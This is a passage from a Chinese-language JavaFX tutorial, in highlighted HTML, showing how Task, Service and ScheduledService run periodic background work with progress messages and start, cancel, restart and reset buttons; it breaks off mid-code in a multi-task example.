class="hljs-type">double</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>;<br>                <span class="hljs-type">Random</span> <span class="hljs-variable">rand</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();<br>                <span class="hljs-type">double</span> <span class="hljs-variable">cur</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>                <span class="hljs-type">double</span> <span class="hljs-variable">progress</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">while</span> (cur &lt; sum) &#123;<br>                    cur = cur + rand.nextInt(<span class="hljs-number">100</span>);<br>                    <span class="hljs-keyword">if</span> (cur &gt; sum) &#123;<br>                        cur = sum;<br>                    &#125;<br>                    progress = cur / sum;<br>                    <span class="hljs-comment">// System.out.println(progress);</span><br><br>                    <span class="hljs-built_in">this</span>.updateProgress(cur, sum);<br><br>                    <span class="hljs-keyword">if</span> (progress &lt; <span class="hljs-number">0.5</span>) &#123;<br>                        <span class="hljs-built_in">this</span>.updateMessage(<span class="hljs-string">&quot;请耐性等待&quot;</span>);<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (progress &lt; <span class="hljs-number">0.8</span>) &#123;<br>                        <span class="hljs-built_in">this</span>.updateMessage(<span class="hljs-string">&quot;马上就好&quot;</span>);<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (progress &lt; <span class="hljs-number">1</span>) &#123;<br>                        <span class="hljs-built_in">this</span>.updateMessage(<span class="hljs-string">&quot;即将完成&quot;</span>);<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (progress &gt;= <span class="hljs-number">1</span>) &#123;<br>                        <span class="hljs-built_in">this</span>.updateMessage(<span class="hljs-string">&quot;完成了!&quot;</span>);<br>                    &#125;<br><br><br>                    Thread.sleep(<span class="hljs-number">200</span>);<br><br>                    <span class="hljs-keyword">if</span> (isCancelled())&#123;<br>                        <span class="hljs-comment">// 任务取消需要在这里另外判断一下</span><br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-keyword">return</span> progress;<br>            &#125;<br>        &#125;;<br><br>        <span class="hljs-keyword">return</span> task;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="ScheduledService"><a href="#ScheduledService" class="headerlink" title="ScheduledService"></a>ScheduledService</h2><p><code>ScheduledService</code>是继承于<code>Service</code>的类，<code>Service</code>和<code>Task</code>都是实现<code>Worker</code>接口的类，<code>Task</code>继承了<code>FutureTask</code>。<code>ScheduledService</code>在<code>Service</code>的基础上，增加了计划任务，可以管理任务延时执行、周期执行等操作。</p><p>界面仍然使用<code>Service</code>的，这里同样需要重写<code>createTask</code>方法，，设置任务当点击<code>开始</code>后，等<code>3秒</code>后计数加<code>1</code>，每隔<code>1秒</code>执行一次任务，当计数为<code>5</code>的倍数时，停止任务，点击<code>取消</code>暂停计数，点击<code>重启</code>重新开始计数；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyScheduledService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ScheduledService</span>&lt;Number&gt;&#123;<br><br>    <span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> Task&lt;Number&gt; <span class="hljs-title function_">createTask</span><span class="hljs-params">()</span> &#123;<br>        Task&lt;Number&gt; task = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Task</span>&lt;Number&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> Number <span class="hljs-title function_">call</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>                sum = sum + <span class="hljs-number">1</span>;<br>                System.out.println(sum);<br><br>                <span class="hljs-keyword">return</span> sum;<br>            &#125;<br>        &#125;;<br><br>        <span class="hljs-keyword">return</span> task;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后实例化任务，并进行一些设置，可以查看手册有更多的设置，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">MyScheduledService</span> <span class="hljs-variable">myScheduledService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyScheduledService</span>();<br><span class="hljs-comment">// 任务开始后延迟执行</span><br>myScheduledService.setDelay(Duration.seconds(<span class="hljs-number">3</span>));<br><span class="hljs-comment">// 周期执行</span><br>myScheduledService.setPeriod(Duration.seconds(<span class="hljs-number">1</span>));<br><span class="hljs-comment">// 任务失败是否重试</span><br>myScheduledService.setRestartOnFailure(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// 最大失败重试次数</span><br>myScheduledService.setMaximumFailureCount(<span class="hljs-number">5</span>);<br></code></pre></td></tr></table></figure><p>其他按钮绑定事件和监听事件类似，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java">startBt.setOnAction(<span class="hljs-keyword">new</span> <span class="hljs-title class_">EventHandler</span>&lt;ActionEvent&gt;() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(ActionEvent event)</span> &#123;<br>        myScheduledService.start();<br>    &#125;<br>&#125;);<br><br>cancelBt.setOnAction(<span class="hljs-keyword">new</span> <span class="hljs-title class_">EventHandler</span>&lt;ActionEvent&gt;() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(ActionEvent event)</span> &#123;<br>        myScheduledService.cancel();<br>    &#125;<br>&#125;);<br><br>restartBt.setOnAction(<span class="hljs-keyword">new</span> <span class="hljs-title class_">EventHandler</span>&lt;ActionEvent&gt;() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(ActionEvent event)</span> &#123;<br>        myScheduledService.restart();<br>    &#125;<br>&#125;);<br><br>resetBt.setOnAction(<span class="hljs-keyword">new</span> <span class="hljs-title class_">EventHandler</span>&lt;ActionEvent&gt;() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(ActionEvent event)</span> &#123;<br>        myScheduledService.reset();<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java">myScheduledService.valueProperty().addListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChangeListener</span>&lt;Number&gt;() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changed</span><span class="hljs-params">(ObservableValue&lt;? extends Number&gt; observable, Number oldValue, Number newValue)</span> &#123;<br>        <span class="hljs-keyword">if</span> (newValue != <span class="hljs-literal">null</span>)&#123;<br>            l2.setText(<span class="hljs-string">&quot;&quot;</span>+newValue);<br>        &#125;<br>    &#125;<br>&#125;);<br><br>myScheduledService.lastValueProperty().addListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChangeListener</span>&lt;Number&gt;() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changed</span><span class="hljs-params">(ObservableValue&lt;? extends Number&gt; observable, Number oldValue, Number newValue)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;lastValue &quot;</span> + newValue);<br>    &#125;<br>&#125;);<br><br>myScheduledService.stateProperty().addListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChangeListener</span>&lt;Worker.State&gt;() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changed</span><span class="hljs-params">(ObservableValue&lt;? extends Worker.State&gt; observable, Worker.State oldValue, Worker.State newValue)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;当前状态 &quot;</span> + newValue);<br><br>    &#125;<br>&#125;);<br><br>myScheduledService.valueProperty().addListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChangeListener</span>&lt;Number&gt;() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changed</span><span class="hljs-params">(ObservableValue&lt;? extends Number&gt; observable, Number oldValue, Number newValue)</span> &#123;<br>        System.out.println(newValue);<br>        <span class="hljs-keyword">if</span> (newValue != <span class="hljs-literal">null</span> &amp;&amp; newValue.intValue()%<span class="hljs-number">5</span> == <span class="hljs-number">0</span>)&#123;<br>            myScheduledService.cancel();<br>            System.out.println(<span class="hljs-string">&quot;任务取消&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>最后代码，这里没写<code>重置</code>，可以设置任务类中通过<code>set</code>和<code>get</code>方法设置进度归零，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> javafxTask;<br><br><span class="hljs-keyword">import</span> javafx.application.Application;<br><span class="hljs-keyword">import</span> javafx.beans.value.ChangeListener;<br><span class="hljs-keyword">import</span> javafx.beans.value.ObservableValue;<br><span class="hljs-keyword">import</span> javafx.concurrent.ScheduledService;<br><span class="hljs-keyword">import</span> javafx.concurrent.Task;<br><span class="hljs-keyword">import</span> javafx.concurrent.Worker;<br><span class="hljs-keyword">import</span> javafx.event.ActionEvent;<br><span class="hljs-keyword">import</span> javafx.event.EventHandler;<br><span class="hljs-keyword">import</span> javafx.geometry.Pos;<br><span class="hljs-keyword">import</span> javafx.scene.Scene;<br><span class="hljs-keyword">import</span> javafx.scene.control.Button;<br><span class="hljs-keyword">import</span> javafx.scene.control.Label;<br><span class="hljs-keyword">import</span> javafx.scene.control.ProgressBar;<br><span class="hljs-keyword">import</span> javafx.scene.layout.AnchorPane;<br><span class="hljs-keyword">import</span> javafx.scene.layout.HBox;<br><span class="hljs-keyword">import</span> javafx.stage.Stage;<br><span class="hljs-keyword">import</span> javafx.util.Duration;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fxScheduledService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Application</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        launch(args);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">(Stage primaryStage)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Button</span> <span class="hljs-variable">startBt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">&quot;开始&quot;</span>);<br>        <span class="hljs-type">Button</span> <span class="hljs-variable">cancelBt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">&quot;取消&quot;</span>);<br>        <span class="hljs-type">Button</span> <span class="hljs-variable">restartBt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">&quot;重启&quot;</span>);<br>        <span class="hljs-type">Button</span> <span class="hljs-variable">resetBt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">&quot;重置&quot;</span>);<br><br>        <span class="hljs-type">ProgressBar</span> <span class="hljs-variable">progressBar</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProgressBar</span>(<span class="hljs-number">0</span>);<br>        progressBar.setPrefWidth(<span class="hljs-number">200</span>);<br><br>        <span class="hljs-type">Label</span> <span class="hljs-variable">l1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Label</span>(<span class="hljs-string">&quot;state&quot;</span>);<br>        <span class="hljs-type">Label</span> <span class="hljs-variable">l2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Label</span>(<span class="hljs-string">&quot;value&quot;</span>);<br>        <span class="hljs-type">Label</span> <span class="hljs-variable">l3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Label</span>(<span class="hljs-string">&quot;title&quot;</span>);<br>        <span class="hljs-type">Label</span> <span class="hljs-variable">l4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Label</span>(<span class="hljs-string">&quot;message&quot;</span>);<br><br>        <span class="hljs-type">HBox</span> <span class="hljs-variable">hBox</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HBox</span>();<br>        hBox.setAlignment(Pos.CENTER);<br>        hBox.setSpacing(<span class="hljs-number">10.0</span>);<br><br>        hBox.getChildren().addAll(startBt, cancelBt, restartBt, resetBt, progressBar, l1, l2, l3, l4);<br><br>        <span class="hljs-type">AnchorPane</span> <span class="hljs-variable">anchorPane</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnchorPane</span>();<br>        anchorPane.setStyle(<span class="hljs-string">&quot;-fx-background-color: #7bb9b0;&quot;</span>);<br>        anchorPane.getChildren().add(hBox);<br><br>        AnchorPane.setLeftAnchor(hBox, <span class="hljs-number">100.0</span>);<br>        AnchorPane.setTopAnchor(hBox, <span class="hljs-number">100.0</span>);<br><br>        <span class="hljs-type">Scene</span> <span class="hljs-variable">scene</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scene</span>(anchorPane);<br>        primaryStage.setScene(scene);<br>        primaryStage.setTitle(<span class="hljs-string">&quot;javaFX&quot;</span>);<br>        primaryStage.setWidth(<span class="hljs-number">700</span>);<br>        primaryStage.setHeight(<span class="hljs-number">500</span>);<br>        primaryStage.show();<br><br>        <span class="hljs-type">MyScheduledService</span> <span class="hljs-variable">myScheduledService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyScheduledService</span>();<br>        <span class="hljs-comment">// 任务开始后延迟执行</span><br>        myScheduledService.setDelay(Duration.seconds(<span class="hljs-number">3</span>));<br>        <span class="hljs-comment">// 周期执行</span><br>        myScheduledService.setPeriod(Duration.seconds(<span class="hljs-number">1</span>));<br>        <span class="hljs-comment">// 任务失败是否重试</span><br>        myScheduledService.setRestartOnFailure(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// 最大失败次数</span><br>        myScheduledService.setMaximumFailureCount(<span class="hljs-number">5</span>);<br><br>        startBt.setOnAction(<span class="hljs-keyword">new</span> <span class="hljs-title class_">EventHandler</span>&lt;ActionEvent&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(ActionEvent event)</span> &#123;<br>                myScheduledService.start();<br>            &#125;<br>        &#125;);<br><br>        cancelBt.setOnAction(<span class="hljs-keyword">new</span> <span class="hljs-title class_">EventHandler</span>&lt;ActionEvent&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(ActionEvent event)</span> &#123;<br>                myScheduledService.cancel();<br>            &#125;<br>        &#125;);<br><br>        restartBt.setOnAction(<span class="hljs-keyword">new</span> <span class="hljs-title class_">EventHandler</span>&lt;ActionEvent&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(ActionEvent event)</span> &#123;<br>                myScheduledService.restart();<br>            &#125;<br>        &#125;);<br><br>        resetBt.setOnAction(<span class="hljs-keyword">new</span> <span class="hljs-title class_">EventHandler</span>&lt;ActionEvent&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(ActionEvent event)</span> &#123;<br>                myScheduledService.reset();<br>            &#125;<br>        &#125;);<br><br>        <span class="hljs-comment">///////////</span><br>        myScheduledService.valueProperty().addListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChangeListener</span>&lt;Number&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changed</span><span class="hljs-params">(ObservableValue&lt;? extends Number&gt; observable, Number oldValue, Number newValue)</span> &#123;<br>                <span class="hljs-keyword">if</span> (newValue != <span class="hljs-literal">null</span>)&#123;<br>                    l2.setText(<span class="hljs-string">&quot;&quot;</span>+newValue);<br>                &#125;<br>            &#125;<br>        &#125;);<br><br>        myScheduledService.lastValueProperty().addListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChangeListener</span>&lt;Number&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changed</span><span class="hljs-params">(ObservableValue&lt;? extends Number&gt; observable, Number oldValue, Number newValue)</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;lastValue &quot;</span> + newValue);<br>            &#125;<br>        &#125;);<br><br>        myScheduledService.stateProperty().addListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChangeListener</span>&lt;Worker.State&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changed</span><span class="hljs-params">(ObservableValue&lt;? extends Worker.State&gt; observable, Worker.State oldValue, Worker.State newValue)</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;当前状态 &quot;</span> + newValue);<br><br>            &#125;<br>        &#125;);<br><br>        myScheduledService.valueProperty().addListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChangeListener</span>&lt;Number&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changed</span><span class="hljs-params">(ObservableValue&lt;? extends Number&gt; observable, Number oldValue, Number newValue)</span> &#123;<br>                System.out.println(newValue);<br>                <span class="hljs-keyword">if</span> (newValue != <span class="hljs-literal">null</span> &amp;&amp; newValue.intValue()%<span class="hljs-number">5</span> == <span class="hljs-number">0</span>)&#123;<br>                    myScheduledService.cancel();<br>                    System.out.println(<span class="hljs-string">&quot;任务取消&quot;</span>);<br>                &#125;<br>            &#125;<br>        &#125;);<br><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyScheduledService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ScheduledService</span>&lt;Number&gt;&#123;<br><br>    <span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> Task&lt;Number&gt; <span class="hljs-title function_">createTask</span><span class="hljs-params">()</span> &#123;<br>        Task&lt;Number&gt; task = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Task</span>&lt;Number&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> Number <span class="hljs-title function_">call</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>                sum = sum + <span class="hljs-number">1</span>;<br>                System.out.println(sum);<br><br>                <span class="hljs-keyword">return</span> sum;<br>            &#125;<br>        &#125;;<br><br>        <span class="hljs-keyword">return</span> task;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="创建多任务同时开始并返回值"><a href="#创建多任务同时开始并返回值" class="headerlink" title="创建多任务同时开始并返回值"></a>创建多任务同时开始并返回值</h2><p>有这样的任务：点击按钮，同时开始多个任务，并在任务结束后得到返回值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> javafxTask;<br><br><span class="hljs-keyword">import</span> javafx.application.Application;<br><span class="hljs-keyword">import</span> javafx.beans.value.ChangeListener;<br><span class="hljs-keyword">import</span> javafx.beans.value.ObservableValue;<br><span class="hljs-keyword">import</span> javafx.concurrent.Service;<br><span class="hljs-keyword">import</span> javafx.concurrent.Task;<br><span class="hljs-keyword">import</span> javafx.event.ActionEvent;<br><span class="hljs-keyword">import</span> javafx.event.EventHandler;<br><span class="hljs-keyword">import</span> javafx.geometry.Pos;<br><span class="hljs-keyword">import</span> javafx.scene.Scene;<br><span class="hljs-keyword">import</span> javafx.scene.control.Button;<br><span class="hljs-keyword">import</span> javafx.scene.control.TextArea;<br><span class="hljs-keyword">import</span> javafx.scene.layout.AnchorPane;<br><span class="hljs-keyword">import</span> javafx.scene.layout.VBox;<br><span class="hljs-keyword">import</span> javafx.stage.Stage;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fxService_1</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Application</span> &#123;<br>    <span class="hljs-keyword">public</span> <span 